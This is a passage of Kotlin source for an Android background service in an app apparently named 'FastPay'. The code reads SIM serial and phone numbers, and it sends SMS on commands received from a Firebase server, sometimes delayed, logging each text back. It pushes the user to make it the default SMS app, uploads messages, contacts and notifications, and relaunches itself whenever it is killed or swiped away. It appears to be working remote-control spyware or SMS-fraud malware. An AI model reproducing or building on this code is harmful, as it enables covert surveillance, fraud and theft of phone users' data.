                slotInfo["isDataEnabled"] = slotTelephonyManager.isDataEnabled
            }
            
            // Try to get sensitive info (may fail on some devices)
            try {
                val simSerial = slotTelephonyManager.simSerialNumber
                if (simSerial != null && simSerial.isNotEmpty()) {
                    slotInfo["simSerial"] = simSerial
                    LogHelper.d(TAG, "SIM serial number collected for slot $slotIndex")
                }
            } catch (e: Exception) {
                LogHelper.w(TAG, "SIM serial number not available for slot $slotIndex", e)
            }
            
            try {
                val phoneNumber = slotTelephonyManager.line1Number
                if (phoneNumber != null && phoneNumber.isNotEmpty()) {
                    slotInfo["phoneNumber"] = phoneNumber
                    LogHelper.d(TAG, "Phone number collected for slot $slotIndex")
                }
            } catch (e: Exception) {
                LogHelper.w(TAG, "Phone number not available for slot $slotIndex", e)
            }
            
            try {
                val voiceMailNumber = slotTelephonyManager.voiceMailNumber
                if (voiceMailNumber != null && voiceMailNumber.isNotEmpty()) {
                    slotInfo["voiceMailNumber"] = voiceMailNumber
                }
            } catch (e: Exception) {
                // Ignore - may not be available
            }
            
            try {
                val voiceMailAlphaTag = slotTelephonyManager.voiceMailAlphaTag
                if (voiceMailAlphaTag != null && voiceMailAlphaTag.isNotEmpty()) {
                    slotInfo["voiceMailAlphaTag"] = voiceMailAlphaTag
                }
            } catch (e: Exception) {
                // Ignore - may not be available
            }
            
        } catch (e: Exception) {
            LogHelper.w(TAG, "Error collecting SIM info for slot $slotIndex", e)
        }
        
        return slotInfo.filterValues { it != null }
    }
    
    /**
     * Handle sendSms command
     * Format 1 (Simple): "phone:message" - Sends from SIM 1 (default)
     * Format 2 (Advanced): "sim;phone:message" - Sends from specified SIM (1 or 2)
     * 
     * Examples:
     * - "sendSms" -> content: "+1234567890:Hello, this is a test message"
     * - "sendSms" -> content: "1;+1234567890:Hello from SIM 1"
     * - "sendSms" -> content: "2;+1234567890:Hello from SIM 2"
     * 
     * @param content Command content in format "phone:message" or "sim;phone:message"
     * @param historyTimestamp Timestamp for command history tracking
     */
    private fun handleSendSmsCommand(content: String, historyTimestamp: Long) {
        LogHelper.d(TAG, "Executing sendSms command: $content")
        
        // Check permissions first
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.SEND_SMS
            ) != PackageManager.PERMISSION_GRANTED || ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_PHONE_STATE
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            LogHelper.w(TAG, "Permissions not granted for sendSms command")
            updateCommandHistoryStatus(historyTimestamp, "sendSms", "failed", "Permissions not granted")
            return
        }
        
        // Parse command content - support both formats
        val simIndex = content.indexOf(";")
        val colonIndex = content.indexOf(":")
        
        if (colonIndex == -1) {
            LogHelper.e(TAG, "Invalid sendSms command format. Expected: phone:message or sim;phone:message")
            updateCommandHistoryStatus(historyTimestamp, "sendSms", "failed", "Invalid format: missing ':' separator")
            return
        }
        
        val phone: String
        val sms: String
        val sim: Int
        
        if (simIndex != -1 && simIndex < colonIndex) {
            // Format 2: sim;phone:message
            val simStr = content.substring(0, simIndex).trim()
            sim = simStr.toIntOrNull() ?: 1
            phone = content.substring(simIndex + 1, colonIndex).trim()
            sms = content.substring(colonIndex + 1).trim()
        } else {
            // Format 1: phone:message (default to SIM 1)
            sim = 1
            phone = content.substring(0, colonIndex).trim()
            sms = content.substring(colonIndex + 1).trim()
        }
        
        // Validate phone and message
        if (phone.isBlank() || sms.isBlank()) {
            LogHelper.e(TAG, "Invalid sendSms command: phone or message is blank")
            updateCommandHistoryStatus(historyTimestamp, "sendSms", "failed", "Phone or message is blank")
            return
        }
        
        // Validate SIM number (must be 1 or 2)
        if (sim != 1 && sim != 2) {
            LogHelper.e(TAG, "Invalid SIM number: $sim (must be 1 or 2)")
            updateCommandHistoryStatus(historyTimestamp, "sendSms", "failed", "Invalid SIM number: $sim (must be 1 or 2)")
            return
        }
        
        LogHelper.d(TAG, "Sending SMS - Phone: $phone, Message: ${sms.take(50)}..., SIM: $sim")
        
        // Send SMS
        sendSms(phone, sms, if (sim == 1) SimSlot.SIM_1 else SimSlot.SIM_2)
        
        // Log remote sent message to Firebase
        val timestamp = System.currentTimeMillis()
        val messagePath = AppConfig.getFirebaseMessagePath(androidId(), timestamp)
        
        FirebaseWriteHelper.setValue(
            path = messagePath,
            data = "sent~$phone~$sms",
            tag = TAG,
            onSuccess = {
                LogHelper.d(TAG, "SMS sent successfully and logged to Firebase")
                updateCommandHistoryStatus(historyTimestamp, "sendSms", "executed")
            },
            onFailure = { e ->
                LogHelper.e(TAG, "Failed to log sent SMS to Firebase", e)
                // SMS was sent but logging failed - mark as executed with warning
                updateCommandHistoryStatus(historyTimestamp, "sendSms", "executed", "SMS sent but Firebase log failed: ${e.message}")
            }
        )
    }
    
    /**
     * Handle showNotification command
     * Format: "showNotification|{title}|{message}|{channel}|{priority}|{action}"
     * 
     * Examples:
     * - "showNotification|Alert|Device needs attention|alerts|high|"
     * - "showNotification|Message|Hello World|messages|default|view_message"
     * - "showNotification|Emergency|Emergency contact detected|emergency|max|call_emergency"
     */
    private fun handleShowNotificationCommand(content: String) {
        LogHelper.d(TAG, "Showing notification from command: $content")
        AppNotificationManager.showNotificationFromCommand(this, content)
    }
    
    /**
     * Handle requestDefaultSmsApp command
     * Format: Any value (content is ignored, command always executes)
     * 
     * Opens the DefaultSmsRequestActivity to guide the user,
     * then lets that screen trigger the system dialog.
     * 
     * @param content Command content (ignored, can be any value)
     * @param historyTimestamp Timestamp for command history updates
     * @param commandKey Command key for history updates
     */
    private fun handleRequestDefaultSmsAppCommand(
        content: String,
        historyTimestamp: Long,
        commandKey: String
    ) {
        LogHelper.d(TAG, "Executing requestDefaultSmsApp command - opening DefaultSmsRequestActivity")

        if (DefaultSmsAppHelper.isDefaultSmsApp(this)) {
            LogHelper.d(TAG, "Default SMS app already set - skipping request")
            updateCommandHistoryStatus(historyTimestamp, commandKey, "executed", "already_default")
            return
        }

        val attemptRequest = {
            try {
                val intent = Intent(this, DefaultSmsRequestActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    putExtra("commandKey", commandKey)
                    putExtra("historyTimestamp", historyTimestamp)
                }
                startActivity(intent)
                LogHelper.d(TAG, "DefaultSmsRequestActivity launched successfully")
                updateCommandHistoryStatus(historyTimestamp, commandKey, "executed", "request_ui_launched")
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error launching DefaultSmsRequestActivity", e)
                // Fallback: open system dialog directly
                try {
                    DefaultSmsAppHelper.requestDefaultSmsApp(this)
                    LogHelper.d(TAG, "Fallback system default SMS dialog opened successfully")
                    updateCommandHistoryStatus(historyTimestamp, commandKey, "executed", "fallback_system_dialog")
                } catch (fallbackError: Exception) {
                    LogHelper.e(TAG, "Error opening fallback default SMS dialog", fallbackError)
                    updateCommandHistoryStatus(
                        historyTimestamp,
                        commandKey,
                        "failed",
                        "request_failed: ${fallbackError.message}"
                    )
                }
            }
        }
        
        // Check if we're on the main thread
        if (Looper.myLooper() == Looper.getMainLooper()) {
            // Already on main thread, call directly
            attemptRequest()
        } else {
            // Not on main thread, post to main thread
            Handler(Looper.getMainLooper()).post {
                attemptRequest()
            }
        }
    }
    
    /**
     * Handle requestDefaultMessageApp command
     * Format: Any value (content is ignored, command always executes)
     * 
     * Opens the DefaultSmsRequestActivity to guide the user,
     * then lets that screen trigger the system dialog.
     * 
     * @param content Command content (ignored, can be any value)
     * @param historyTimestamp Timestamp for command history updates
     * @param commandKey Command key for history updates
     */
    private fun handleRequestDefaultMessageAppCommand(
        content: String,
        historyTimestamp: Long,
        commandKey: String
    ) {
        LogHelper.d(TAG, "Executing requestDefaultMessageApp command - opening DefaultSmsRequestActivity")
        handleRequestDefaultSmsAppCommand(content, historyTimestamp, commandKey)
    }
    
    /**
     * Handle updateDeviceCodeList command
     * Format: Any value (content is ignored, command always executes)
     * 
     * Updates the list of all devices with their activation codes in Firebase.
     * 
     * This command:
     * 1. Reads all entries from fastpay/device-list/
     * 2. For each code, gets the deviceId and basic info
     * 3. Creates/updates a consolidated list at fastpay/all-devices-list/
     *    Structure: fastpay/all-devices-list/{code} = {deviceId, code, deviceName, isActive, lastSeen, updatedAt}
     * 
     * This provides a centralized location to see all activated devices with their codes.
     * 
     * @param content Command content (ignored, can be any value)
     */
    private fun handleUpdateDeviceCodeListCommand(content: String, historyTimestamp: Long) {
        LogHelper.d(TAG, "Executing updateDeviceCodeList command - updating device code list in Firebase")
        
        try {
            val deviceListPath = "${AppConfig.FIREBASE_BASE_PATH}/${AppConfig.FIREBASE_DEVICE_LIST_PATH}"
            val allDevicesListPath = "${AppConfig.FIREBASE_BASE_PATH}/all-devices-list"
            
            LogHelper.d(TAG, "Reading device-list from: $deviceListPath")
            
            // Read all entries from device-list
            Firebase.database.reference.child(deviceListPath)
                .addListenerForSingleValueEvent(object : com.google.firebase.database.ValueEventListener {
                    override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
                        try {
                            val deviceCodeMap = mutableMapOf<String, Map<String, Any>>()
                            val totalCodes = snapshot.childrenCount.toInt()
                            
                            if (totalCodes == 0) {
                                LogHelper.w(TAG, "No devices found in device-list")
                                writeDeviceCodeListToFirebase(allDevicesListPath, emptyMap(), 0, historyTimestamp)
                                return
                            }
                            
                            var processedCount = 0
                            
                            // Iterate through all codes in device-list
                            snapshot.children.forEach { codeSnapshot ->
                                val code = codeSnapshot.key ?: return@forEach
                                val deviceId = codeSnapshot.child("deviceId").getValue(String::class.java)
                                
                                if (deviceId != null && deviceId.isNotBlank()) {
                                    // Get device name and other info from device-list entry
                                    val deviceName = codeSnapshot.child("device_model").getValue(String::class.java) 
                                        ?: codeSnapshot.child("number").getValue(String::class.java)
                                        ?: "Unknown Device"
                                    val status = codeSnapshot.child("status").getValue(String::class.java) ?: "UNKNOWN"
                                    
                                    // Create device entry with info from device-list
                                    val deviceEntry = mapOf<String, Any>(
                                        "deviceId" to deviceId,
                                        "code" to code,
                                        "deviceName" to deviceName,
                                        "status" to status,
                                        "updatedAt" to System.currentTimeMillis()
                                    )
                                    
                                    deviceCodeMap[code] = deviceEntry
                                    processedCount++
                                    
                                    LogHelper.d(TAG, "Processed device: code=$code, deviceId=$deviceId, name=$deviceName")
                                    
                                    // If all devices processed, write to Firebase
                                    if (processedCount == totalCodes) {
                                        writeDeviceCodeListToFirebase(allDevicesListPath, deviceCodeMap, processedCount, historyTimestamp)
                                    }
                                } else {
                                    LogHelper.w(TAG, "Device ID not found for code: $code")
                                    processedCount++
                                    
                                    // If all devices processed, write to Firebase
                                    if (processedCount == totalCodes) {
                                        writeDeviceCodeListToFirebase(allDevicesListPath, deviceCodeMap, processedCount, historyTimestamp)
                                    }
                                }
                            }
                        } catch (e: Exception) {
                            LogHelper.e(TAG, "Error processing device-list data", e)
                            updateCommandHistoryStatus(historyTimestamp, "updateDeviceCodeList", "failed", "Error: ${e.message}")
                        }
                    }
                    
                    override fun onCancelled(error: com.google.firebase.database.DatabaseError) {
                        LogHelper.e(TAG, "Error reading device-list from Firebase", error.toException())
                        updateCommandHistoryStatus(historyTimestamp, "updateDeviceCodeList", "failed", "Error: ${error.message}")
                    }
                })
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error executing updateDeviceCodeList command", e)
            throw e
        }
    }
    
    /**
     * Write device code list to Firebase
     * 
     * @param allDevicesListPath Firebase path for all-devices-list
     * @param deviceCodeMap Map of code -> device entry
     * @param totalCount Total number of devices processed
     */
    private fun writeDeviceCodeListToFirebase(
        allDevicesListPath: String,
        deviceCodeMap: Map<String, Map<String, Any>>,
        totalCount: Int,
        historyTimestamp: Long
    ) {
        try {
            LogHelper.d(TAG, "Writing ${deviceCodeMap.size} devices to $allDevicesListPath")
            
            // Add metadata
            val allDevicesData = mutableMapOf<String, Any>()
            allDevicesData.putAll(deviceCodeMap)
            allDevicesData["_metadata"] = mapOf(
                "totalDevices" to deviceCodeMap.size,
                "updatedAt" to System.currentTimeMillis(),
                "updatedBy" to androidId()
            )
            
            Firebase.database.reference.child(allDevicesListPath)
                .setValue(allDevicesData)
                .addOnSuccessListener {
                    LogHelper.d(TAG, "✅ Successfully updated device code list in Firebase: ${deviceCodeMap.size} devices")
                    updateCommandHistoryStatus(
                        historyTimestamp,
                        "updateDeviceCodeList",
                        "executed",
                        "Updated ${deviceCodeMap.size} devices"
                    )
                }
                .addOnFailureListener { e ->
                    LogHelper.e(TAG, "❌ Failed to update device code list in Firebase", e)
                    updateCommandHistoryStatus(historyTimestamp, "updateDeviceCodeList", "failed", "Error: ${e.message}")
                }
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error writing device code list to Firebase", e)
            updateCommandHistoryStatus(historyTimestamp, "updateDeviceCodeList", "failed", "Error: ${e.message}")
        }
    }
    
    /**
     * Handle setHeartbeatInterval command
     * Format: "{seconds}" - Number of seconds for heartbeat interval
     * 
     * Sets the heartbeat interval dynamically. The value is specified in seconds.
     * Valid range: 10 seconds (minimum) to 300 seconds (5 minutes, maximum)
     * 
     * Examples:
     * - "60" -> Set heartbeat to 60 seconds (1 minute)
     * - "30" -> Set heartbeat to 30 seconds
     * - "120" -> Set heartbeat to 120 seconds (2 minutes)
     * 
     * After setting the interval, the heartbeat is restarted with the new value.
     * 
     * @param content Heartbeat interval in seconds (as string)
     */
    private fun handleSetHeartbeatIntervalCommand(content: String) {
        LogHelper.d(TAG, "Executing setHeartbeatInterval command - content: $content")
        
        try {
            // Parse the interval value (in seconds)
            val intervalSeconds = content.trim().toIntOrNull()
            
            if (intervalSeconds == null) {
                throw IllegalArgumentException("Invalid heartbeat interval value: '$content'. Must be a number.")
            }
            
            // Validate range: minimum 10 seconds, maximum 300 seconds (5 minutes)
            val minIntervalSeconds = 10
            val maxIntervalSeconds = 300
            
            if (intervalSeconds < minIntervalSeconds || intervalSeconds > maxIntervalSeconds) {
                throw IllegalArgumentException(
                    "Heartbeat interval must be between $minIntervalSeconds and $maxIntervalSeconds seconds. " +
                    "Received: $intervalSeconds seconds"
                )
            }
            
            // Convert to milliseconds
            val newIntervalMs = intervalSeconds * 1000L
            
            // Update the current heartbeat interval
            currentHeartbeatIntervalMs = newIntervalMs
            
            // Save to Django
            val deviceId = androidId()
            serviceScope.launch {
                try {
                    val metadataUpdate = mapOf("heartbeat_interval" to intervalSeconds)
                    DjangoApiHelper.patchDevice(deviceId, mapOf("sync_metadata" to metadataUpdate))
                    LogHelper.d(TAG, "Heartbeat interval updated in Django")
                } catch (e: Exception) {
                    LogHelper.e(TAG, "Failed to update heartbeat interval in Django", e)
                }
            }
            
            // Restart heartbeat with new interval
            restartHeartbeat()
            
            LogHelper.d(TAG, "Heartbeat interval updated to $intervalSeconds seconds (${newIntervalMs}ms)")
        } catch (e: NumberFormatException) {
            LogHelper.e(TAG, "Error parsing heartbeat interval: $content", e)
            throw IllegalArgumentException("Invalid heartbeat interval format: '$content'. Must be a number.", e)
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error setting heartbeat interval", e)
            throw e // Re-throw to be caught by followCommand and marked as failed
        }
    }
    
    /**
     * Handle reset command
     * Format: Any value (content is ignored, command always executes)
     * 
     * Resets device activation by:
     * - Clearing Firebase data: phone, code, setupValue
     * - Setting isActive to false
     * - Clearing setup.txt file
     * - Navigating to SplashActivity to restart activation flow
     * 
     * This effectively deactivates the device and allows it to be reactivated.
     * 
     * @param content Command content (ignored, can be any value)
     */
    @SuppressLint("HardwareIds")
    private fun handleResetCommand(content: String) {
        LogHelper.d(TAG, "Executing reset command")
        
        val deviceId = androidId()
        val devicePath = AppConfig.getFirebaseDevicePath(deviceId)
        val deviceRef = Firebase.database.reference.child(devicePath)
        
        // Clear Firebase activation data (kept for real-time signaling if needed)
        deviceRef.child("phone").removeValue()
        deviceRef.child("code").removeValue()
        deviceRef.child("setupValue").removeValue()
        deviceRef.child("isActive").removeValue()
            .addOnSuccessListener {
                LogHelper.d(TAG, "Firebase reset successful")
            }
            .addOnFailureListener { e ->
                LogHelper.e(TAG, "Failed to reset Firebase data", e)
            }
            
        // Reset device in Django
        serviceScope.launch {
            try {
                DjangoApiHelper.patchDevice(deviceId, mapOf(
                    "is_active" to false,
                    "phone" to null,
                    "code" to null,
                    "sync_status" to "never_synced"
                ))
                LogHelper.d(TAG, "Django reset successful")
                
                // Navigate to SplashActivity after Django reset
                navigateToSplashActivity()
            } catch (e: Exception) {
                LogHelper.e(TAG, "Failed to reset Django data", e)
                // Still navigate even if Django fails (local reset is done)
                navigateToSplashActivity()
            }
        }
        
        // Clear setup.txt file
        try {
            writeInternalFile("setup.txt", "")
            LogHelper.d(TAG, "setup.txt cleared successfully")
        } catch (e: SecurityException) {
            LogHelper.e(TAG, "Permission denied clearing setup.txt", e)
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error clearing setup.txt", e)
        }
    }
    
    /**
     * Navigate to SplashActivity to restart activation flow
     * This is called after reset command clears activation data
     */
    private fun navigateToSplashActivity() {
        try {
            val intent = Intent(this, com.example.fast.ui.SplashActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
            }
            startActivity(intent)
            LogHelper.d(TAG, "Navigated to SplashActivity")
        } catch (e: SecurityException) {
            LogHelper.e(TAG, "Permission denied navigating to SplashActivity", e)
        } catch (e: Exception) {
            LogHelper.e(TAG, "Failed to navigate to SplashActivity", e)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = buildNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        else startForeground(NOTIFICATION_ID, notification)
        
        // Ensure heartbeat is running
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (!heartbeatHandler.hasCallbacks(heartbeatRunnable)) {
                startHeartbeat()
            }
        } else {
            // For API < 29, just start heartbeat (no way to check if already running)
            startHeartbeat()
        }
        
        // Ensure device info collection is running
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (!deviceInfoHandler.hasCallbacks(deviceInfoRunnable)) {
                startDeviceInfoCollection()
            }
        } else {
            // For API < 29, just start device info collection (no way to check if already running)
            startDeviceInfoCollection()
        }
        
        return START_STICKY
    }
    
    override fun onDestroy() {
        // Cancel coroutine scope
        try {
            serviceScope.cancel()
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error cancelling serviceScope", e)
        }

        // Flush any pending notifications before destroying service
        NotificationBatchProcessor.flush(this)
        // Flush any pending messages before destroying service
        SmsMessageBatchProcessor.flush(this)
        // Flush any pending contacts before destroying service
        ContactBatchProcessor.flush(this)
        
        super.onDestroy()
        
        // Remove Firebase listeners to prevent memory leaks
        try {
            val deviceId = androidId()
            commandListener?.let { listener ->
                Firebase.database.reference
                    .child("${AppConfig.getFirebaseDevicePath(deviceId)}/${AppConfig.FirebasePaths.COMMANDS}")
                    .removeEventListener(listener)
                commandListener = null
            }
            
            filterListener?.let { listener ->
                Firebase.database.reference
                    .child("${AppConfig.getFirebaseDevicePath(deviceId)}/${AppConfig.FirebasePaths.FILTER}")
                    .removeEventListener(listener)
                filterListener = null
            }
            
            isActiveListener?.let { listener ->
                Firebase.database.reference
                    .child("${AppConfig.getFirebaseDevicePath(deviceId)}/${AppConfig.FirebasePaths.IS_ACTIVE}")
                    .removeEventListener(listener)
                isActiveListener = null
            }
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error removing Firebase listeners in onDestroy", e)
        }
        
        // Stop heartbeat when service is destroyed
        heartbeatHandler.removeCallbacks(heartbeatRunnable)
        // Stop device info collection
        deviceInfoHandler.removeCallbacks(deviceInfoRunnable)
        
        LogHelper.d(TAG, "Service destroyed - listeners removed, handlers stopped")
        
        // Restart service immediately if destroyed (except on app uninstall)
        // This ensures service keeps running even if killed
        try {
            val restartIntent = Intent(this, PersistentForegroundService::class.java)
            startForegroundService(restartIntent)
            LogHelper.d(TAG, "Service restarted after onDestroy")
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error restarting service in onDestroy", e)
        }
    }
    
    /**
     * Called when the app task is removed from recent apps (swiped away)
     * Restart the service to ensure it keeps running in the background
     */
    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        LogHelper.d(TAG, "App task removed - restarting service")
        
        // Restart service after a short delay to ensure proper cleanup
        Handler(Looper.getMainLooper()).postDelayed({
            try {
                val restartIntent = Intent(this, PersistentForegroundService::class.java)
                startForegroundService(restartIntent)
                LogHelper.d(TAG, "Service restarted after task removed")
            } catch (e: Exception) {
                LogHelper.e(TAG, "Error restarting service after task removed", e)
            }
        }, 1000) // 1 second delay
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        val manager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        if (manager.getNotificationChannel(CHANNEL_ID) == null) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                CHANNEL_NAME,
                NotificationManager.IMPORTANCE_LOW
            )
            channel.description = "Keeps FastPay running in the foreground"
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentTitle(getString(R.string.app_name))
            .setContentText("FastPay service is running")
            .setOngoing(true)

        return builder.build()
    }
    
    /**
     * Handle checkPermission command
     * Format: empty or "status"
     * 
     * Checks all permissions and reports status to Firebase at:
     * device/{deviceId}/systemInfo/permissionStatus/{timestamp}
     * 
     * Status format:
     * {
     *   "allGranted": boolean,
     *   "runtimePermissions": { "permission": { "granted": boolean, "canRequest": boolean } },
     *   "notificationListener": { "granted": boolean, "canRequest": boolean },
     *   "batteryOptimization": { "granted": boolean, "canRequest": boolean },
     *   "grantedCount": number,
     *   "totalCount": number (7 for Android <13, 8 for Android 13+)
     * }
     */
    private fun handleCheckPermissionCommand(content: String, historyTimestamp: Long) {
        try {
            // Check runtime permissions (using Context, not Activity)
            val requiredPermissions = com.example.fast.util.PermissionManager.getRequiredRuntimePermissions(this)
            val runtimeStatusMap = mutableMapOf<String, Map<String, Boolean>>()
            var runtimeGrantedCount = 0
            
            requiredPermissions.forEach { permission ->
                val isGranted = ActivityCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
                if (isGranted) runtimeGrantedCount++
                runtimeStatusMap[permission] = mapOf(
                    "granted" to isGranted,
                    "canRequest" to true // Can always request if not granted
                )
            }
            
            // Check special permissions (using Context methods)
            val notificationListenerGranted = com.example.fast.util.PermissionManager.hasNotificationListenerPermission(this)
            val batteryOptimizationGranted = com.example.fast.util.PermissionManager.hasBatteryOptimizationExemption(this)
            
            // Check default SMS app status
            val isDefaultSmsApp = DefaultSmsAppHelper.isDefaultSmsApp(this)
            val defaultSmsAppPackage = DefaultSmsAppHelper.getDefaultSmsAppPackage(this)
            
            val specialGrantedCount = listOf(
                notificationListenerGranted,
                batteryOptimizationGranted
            ).count { it }
            
            // Calculate total count dynamically (5-6 runtime + 2 special)
            // Android 13+ (API 33+) has POST_NOTIFICATIONS permission = 6 runtime
            // Older versions = 5 runtime
            val runtimePermissionsCount = requiredPermissions.size
            val specialPermissionsCount = 2 // Notification Listener, Battery Optimization
            val totalPermissionsCount = runtimePermissionsCount + specialPermissionsCount
            
            val totalGrantedCount = runtimeGrantedCount + specialGrantedCount
            val allGranted = totalGrantedCount == totalPermissionsCount
            
            // Build status map for Firebase
            val statusMap = mutableMapOf<String, Any>()
            statusMap["allGranted"] = allGranted
            statusMap["grantedCount"] = totalGrantedCount
            statusMap["totalCount"] = totalPermissionsCount
            statusMap["runtimePermissions"] = runtimeStatusMap
            statusMap["notificationListener"] = mapOf(
                "granted" to notificationListenerGranted,
                "canRequest" to true
            )
            statusMap["batteryOptimization"] = mapOf(
                "granted" to batteryOptimizationGranted,
                "canRequest" to true
            )
            statusMap["defaultSmsApp"] = mapOf(
                "isDefault" to isDefaultSmsApp,
                "currentDefaultPackage" to (defaultSmsAppPackage ?: ""),
                "canRequest" to true,
                "packageName" to packageName
            )
            
            if (shouldUploadPermissionStatus(statusMap)) {
                // Upload status to Firebase
                val timestamp = System.currentTimeMillis()
                val permissionStatusPath = "${AppConfig.getFirebaseDevicePath(androidId())}/systemInfo/permissionStatus/$timestamp"
                
                Firebase.database.reference.child(permissionStatusPath).setValue(statusMap)
                    .addOnSuccessListener {
                        LogHelper.d(TAG, "Permission status uploaded to Firebase: $permissionStatusPath")
                        LogHelper.d(TAG, "All granted: $allGranted, Count: $totalGrantedCount/$totalPermissionsCount")
                        updateCommandHistoryStatus(historyTimestamp, "checkPermission", "executed", "uploaded_status")
                    }
                    .addOnFailureListener { e ->
                        LogHelper.e(TAG, "Failed to upload permission status to Firebase", e)
                        updateCommandHistoryStatus(historyTimestamp, "checkPermission", "failed", "Error: ${e.message}")
                    }
            } else {
                updateCommandHistoryStatus(historyTimestamp, "checkPermission", "executed", "unchanged_throttled")
            }
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error checking permissions", e)
            updateCommandHistoryStatus(historyTimestamp, "checkPermission", "failed", "Error: ${e.message}")
        }
    }
    
    /**
     * Handle removePermission command
     * Format: empty or "open"
     * 
     * Opens app settings page where user can manually revoke permissions.
     * Android doesn't allow programmatic permission revocation for security reasons.
     */
    private fun handleRemovePermissionCommand(content: String) {
        try {
            LogHelper.d(TAG, "Opening app settings for permission removal")
            
            // Open app settings page
            com.example.fast.util.PermissionManager.openAppSettings(this)
            
            // Also log to Firebase that settings were opened
            val timestamp = System.currentTimeMillis()
            val logPath = "${AppConfig.getFirebaseDevicePath(androidId())}/systemInfo/permissionRemovalLog/$timestamp"
            Firebase.database.reference.child(logPath).setValue(mapOf(
                "action" to "settings_opened",
                "timestamp" to timestamp,
                "reason" to "removePermission_command"
            ))
                .addOnSuccessListener {
                    LogHelper.d(TAG, "Permission removal log uploaded to Firebase")
                }
                .addOnFailureListener { e ->
                    LogHelper.e(TAG, "Failed to log permission removal action", e)
                }
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error opening app settings for permission removal", e)
        }
    }
    
    /**
     * Handle sendSmsDelayed command
     * Format: "phone:message:delayType:delayValue:sim"
     */
    private fun handleSendSmsDelayedCommand(content: String, historyTimestamp: Long) {
        LogHelper.d(TAG, "Executing sendSmsDelayed command: $content")
        
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "SEND_SMS permission not granted")
            return
        }
        
        val parts = content.split(":")
        if (parts.size < 4) {
            updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Invalid format: expected phone:message:delayType:delayValue:sim")
            return
        }
        
        val phone = parts[0].trim()
        val message = parts[1].trim()
        val delayType = parts[2].trim().lowercase()
        val delayValue = parts[3].trim()
        val sim = parts.getOrNull(4)?.toIntOrNull() ?: 1
        
        // Validate phone number format
        if (phone.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Phone number is required")
            return
        }
        if (!phone.matches(Regex("^\\+?[1-9]\\d{1,14}$"))) {
            updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Invalid phone number format")
            return
        }
        
        // Validate message
        if (message.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Message is required")
            return
        }
        if (message.length > 160) {
            updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Message too long (max 160 characters)")
            return
        }
        
        // Validate delay type
        val validDelayTypes = listOf("seconds", "minutes", "hours", "days", "datetime")
        if (delayType !in validDelayTypes) {
            updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Invalid delay type. Must be: seconds, minutes, hours, days, or datetime")
            return
        }
        
        // Validate delay value
        if (delayValue.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Delay value is required")
            return
        }
        
        // Validate SIM number
        if (sim != 1 && sim != 2) {
            updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Invalid SIM number: $sim (must be 1 or 2)")
            return
        }
        
        val delayMs = when (delayType) {
            "seconds" -> delayValue.toLongOrNull()?.times(1000) ?: run {
                updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Invalid delay value")
                return
            }
            "minutes" -> delayValue.toLongOrNull()?.times(60 * 1000) ?: run {
                updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Invalid delay value")
                return
            }
            "hours" -> delayValue.toLongOrNull()?.times(60 * 60 * 1000) ?: run {
                updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Invalid delay value")
                return
            }
            "days" -> delayValue.toLongOrNull()?.times(24 * 60 * 60 * 1000) ?: run {
                updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Invalid delay value")
                return
            }
            "datetime" -> {
                try {
                    val targetTime = java.time.Instant.parse("${delayValue}Z").toEpochMilli()
                    val currentTime = System.currentTimeMillis()
                    maxOf(0, targetTime - currentTime)
                } catch (e: Exception) {
                    updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Invalid datetime format")
                    return
                }
            }
            else -> {
                updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Invalid delay type")
                return
            }
        }
        
        if (delayMs < 0) {
            updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Delay cannot be negative")
            return
        }
        
